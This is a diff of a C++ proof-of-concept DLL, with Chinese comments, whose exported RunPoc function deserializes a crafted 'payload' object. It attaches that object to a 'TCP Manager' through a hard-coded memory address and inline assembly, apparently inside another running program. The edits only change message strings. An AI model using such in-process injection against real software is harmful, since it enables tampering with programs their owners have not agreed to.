@@ -45,7 +45,7 @@ extern "C" __declspec(dllexport) void RunPoc()
     // 1. 反序列化验证
     try {
         obj->Serialize(ar);
-        ::MessageBox(NULL, _T("✅ Serialize OK! Payload is Valid."), _T("Success"), MB_OK);
+        ::MessageBox(NULL, _T("Serialize OK! Payload is Valid."), _T("Success"), MB_OK);
     } catch (CException* e) {
         e->Delete();
         ShowError(_T("Serialize Failed"));
@@ -55,7 +55,7 @@ extern "C" __declspec(dllexport) void RunPoc()
     // 2. 挂载到 TCP Manager
     void* pManager = *(void**)0x0084713C;
     if (!pManager) {
-        ShowError(_T("Manager NULL"));
+        ShowError(_T("Manager is NULL"));
         return;
     }
 
@@ -71,10 +71,10 @@ extern "C" __declspec(dllexport) void RunPoc()
             mov result, eax
         }
 
-        ::MessageBox(NULL, _T("? Attached via Offset 100! Check Tree View!"), _T("Success"), MB_OK);
+        ::MessageBox(NULL, _T("Attached! Check Tree View!"), _T("Done"), MB_OK);
         obj = nullptr;
     } catch (...) {
-        ShowError(_T("Crash at Offset 100. Try Offset 104 next."));
+        ShowError(_T("Crash during Attach"));
     }
 
     // 暂不 delete obj，避免析构潜在崩溃
